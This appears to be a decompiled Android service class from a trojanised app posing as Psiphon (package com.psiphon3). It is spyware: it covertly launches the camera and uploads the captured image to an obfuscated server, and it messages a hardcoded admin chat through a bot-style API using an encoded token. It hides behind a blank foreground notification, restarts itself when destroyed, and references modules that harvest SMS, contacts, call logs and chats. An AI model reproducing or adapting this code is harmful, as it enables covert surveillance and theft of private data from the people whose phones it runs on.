package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class getpicture2 extends  android.app.Service{
	public static class getpicture2_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (getpicture2) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, getpicture2.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static getpicture2 mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return getpicture2.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.getpicture2");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.getpicture2", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (getpicture2) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (getpicture2) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (getpicture2) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (getpicture2) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (getpicture2) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static int _vvv6 = 0;
public static int _vvv7 = 0;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getonechat _vvvvvvvvv0 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _getcam(String _topic,String _filename) throws Exception{
 //BA.debugLineNum = 65;BA.debugLine="Sub getCam (Topic As String, fileName As String)";
 //BA.debugLineNum = 67;BA.debugLine="Try";
try { //BA.debugLineNum = 71;BA.debugLine="cameraId = 1";
_vvv6 = (int) (1);
 //BA.debugLineNum = 72;BA.debugLine="camId = 0";
_vvv7 = (int) (0);
 //BA.debugLineNum = 73;BA.debugLine="StartActivity(cmr2)";
anywheresoftware.b4a.keywords.Common.StartActivity(processBA,(Object)(mostCurrent._vvvvvvvv0.getObject()));
 } 
       catch (Exception e6) {
			processBA.setLastException(e6); //BA.debugLineNum = 75;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 77;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 9;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 10;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 11;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,54,123,-49,72,64,101,-99,35,46,122,-96,87,34,111,-49,57,49,0,-8,35,95,11,-96,87,71,10,-37,45,49,113,-119,82,95}, 354568)+main.vvv13 (new byte[] {87,54,-50,-38,45,37,-75,-19,35,95,-49,-60,38,71,-50,-38,45,37,-75,-19,35,95,-49,-60,38,71,-50,-38,45,37,-75,-19,35,95,-49,-75,87,71,-50,-38,72,64,-95,-7,35,46,-66,-60,87,54,-50,-38,72,64,-60,-100,55,58,-66,-75,38,71,-50,-65,45,49,-75,-19,82,95,-66,-60,50,34,-85,-38,57,49,-60,-19,82,95,-49,-60,87,71,-50,-65,45,64,-75,-19,82,46,-49,-60,87}, 493059)+main.vvv13 (new byte[] {87,71,-89,-17,45,37,-83,-40,35,46,-90,-128,87,71,-89,-17,72,64,-56,-52,82,46,-41,-128,87,71,-89,-17,57,64,-83,-87,55,58,-90,-15,38,71,-89,-17,72,49,-83,-87,82,58,-61,-128,87,71,-89,-98,57,49,-83,-40,35,58,-61,-128,87,71,-42,-17,72,49,-83,-87,35,58,-61,-15,38,54,-42,-98}, 693965)+main.vvv13 (new byte[] {38,55,-37,114,72,65,-59,81,35,94,-85,29,38,70,-86,3,57,48,-59,81,35,47,-38,108,87,55,-86,23,45,48,-96,69,82,47,-85,108,38,70,-37,23,45,65,-96,52,82,94,-85,29,87,55,-37,114,45,36,-47,69,35,94,-85,108,38,70,-86,23,45,65,-96,52,82,94,-38,108,87,55,-37,114,45,36,-96,69,82,47,-38,108,38,55,-37,114,72,36,-59,69,82,94,-85,108,38,70,-86,114,72,36,-59,69,35,47,-85,108,87,55,-86,114,72,36,-59,52,35,94,-85,29,87,70,-86,3,57,65,-59,81,35,94,-85,29,38,70,-86,3,57,48,-59,81,82,47,-38,108,38,70,-86,114,72,65,-96,52,55,59,-38,29,87,70,-37,114}, 132847)+main.vvv13 (new byte[] {87,54,104,120,45,37,98,62,82,95,24,23,38,54,104,120,45,37,98,79,35,95,24,102,38,54,25,120,45,37,19,62,82,95,105,23,87,71,104,120,72,37,118,79,35,46,105,23,87,71,25,120,72,64,19,42,55,46,105,23,87,54,25,9,57,49,98,42,82,58,24,102,38,54,104,120,57,64,19,62,82,58,125,102,38,71,25,120,72,64,98,62,35,58,125,102,87,71,104,9,72,49,19,79,35,58,125,102,38,54,25,9,72,64,98,79}, 318681)+main.vvv13 (new byte[] {87,71,-89,-68,57,49,-71,-18,82,46,-78,-57,87,54,-89,-68,72,64,-71,-97,82,95,-61,-74,87,71,-62,-68,45,64,-71,-18,82,95,-61,-57,38,71,-62,-39,72,37,-83,-18,82,95,-78,-57,87,71,-77,-39,57,37}, 483852);
 //BA.debugLineNum = 12;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 13;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,53,12,126,72,67,119,73,35,92,124,5,50,53,125,126,72,67,6,73,35,45,124,5,50,53,125,126,72,67,6,73,35,45,124,5,50,53,12,126,57,50,119,73,35,45,124,5,50,53,125,126,57,50,119,73,82,92,124,5,50,52,124,27,57,67,6,73,35,92,124,96,87,53,105,27}, 939210)+main.vvv13 (new byte[] {38,70,-75,102,57,65,-50,81,82,47,-47,108,38,70,-75,102,57,65,-50,81,82,47,-47,120,50,55,-60,102,57,65,-50,32,82,94,-59,108,50,70,-60,102,57,48,-50,32,35,94,-59,108,50,55,-60,23,72,65,-65,32,35,47,-59,108,50,55,-75}, 69802)+main.vvv13 (new byte[] {87,68,36,-16,57,67,46,-57,55,57,84,-97,87,53,85,-127,57,67,46,-57,55,57,84,-97,87,68,36,-16,57,50,95,-57,55,57,84,-18,38,68,36,-16,72,67,46,-57,55,57,84,-18,87,53,36,-16,57,67,46,-57,55,57,84,-18,87,68,36,-16,72,67,46,-57,55,45,64,-97,38,68,36,-16,57,67,95,-74,35,57,64,-97,38,68}, 995711)+main.vvv13 (new byte[] {38,54,1,-9,72,49,11,-44,34,58,113,-23,87,54,1,-9,57,64,11,-64,55,58,113,-23,87,71,1,-122,72,64,11,-79,55,58,113,-104,87,71,1,-9,57,49,122,-64,55}, 339080);
 //BA.debugLineNum = 14;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,106,-80,-85,115,47,-21,-86,121,121,-94}, 63982);
 //BA.debugLineNum = 15;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,125,93,27,38,41}, 226752);
 //BA.debugLineNum = 16;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,54,-106,-126,72,64,-19,-75,35,95,-26,-7,50,54,-25,-126,72,64,-100,-75,35,46,-26,-7,50,54,-25,-126,72,64,-100,-75,35,46,-26,-7,50,54,-106,-126,57,49,-19,-75}, 584861)+main.vvv13 (new byte[] {38,54,-79,-72,45,48,-70,-2,35,46,-80,-78,87,54,-79,-35,72,49,-81,-2,82,46,-80,-78,38,54,-79,-84,72,49,-81,-2,35,46,-63,-61,87,71,-79,-84,57,49,-81,-2,35,95,-63,-61,87,71,-79,-35,72,49,-81}, 488496)+main.vvv13 (new byte[] {50,53,54,-76,57,50,60,-125,82,92,55,-49,50,53,54,-76,72,67,77,-125,35,45,55,-49,50,53,71,-59,72,67,77,-14,82,92,55,-49,50,53,71,-76,57,67,77,-125,82,92,55,-49,50,53,71,-76,72,67,77,-14,82,92,55,-49,38,33,54,-59,72,67,77,-125,82,45,70,-37,50,33,54,-59,72,50,60,-14,82,92,55,-86,50,52,34,-59,72,50,77,-14,35,45,55,-86,38,33,34,-59,72,67,60,-125,35,45}, 767071)+main.vvv13 (new byte[] {38,54,90,-61,45,49,33,-32,35,46,42,-72,38,54,90,-61,45,49,33,-32,82,46,42,-72,87,71,90,-61,57,37,80,-32,82,46,91,-55,38}, 426212)+main.vvv13 (new byte[] {38,54,-84,122,45,49,-41,89,82,95,-83,112,38,71,-84,122,45,49,-41,89,35,46,-83}, 456801)+main.vvv13 (new byte[] {38,53,1,-100,45}, 820709);
 //BA.debugLineNum = 17;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 18;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 19;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 20;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 21;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim cameraId As Int";
_vvv6 = 0;
 //BA.debugLineNum = 23;BA.debugLine="Dim camId As Int";
_vvv7 = 0;
 //BA.debugLineNum = 24;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 28;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 30;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 32;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 33;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 34;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 35;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 36;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",getpicture2.getObject());
 //BA.debugLineNum = 37;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",getpicture2.getObject());
 //BA.debugLineNum = 38;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 39;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 40;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 41;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 42;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 43;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 44;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 45;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 47;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 48;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 49;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 50;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 58;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 86;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 87;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 88;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 60;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 63;BA.debugLine="End Sub";
return "";
}
public static String  _uploadimage() throws Exception{
 //BA.debugLineNum = 81;BA.debugLine="Sub uploadImage";
 //BA.debugLineNum = 82;BA.debugLine="upload.upload(admin_id , \"Image\" , camId , File.D";
_vv6._upload(_admin_id,"Image",_vvv7,anywheresoftware.b4a.keywords.Common.File.getDirDefaultExternal(),"cmr.jpg");
 //BA.debugLineNum = 83;BA.debugLine="End Sub";
return "";
}
}
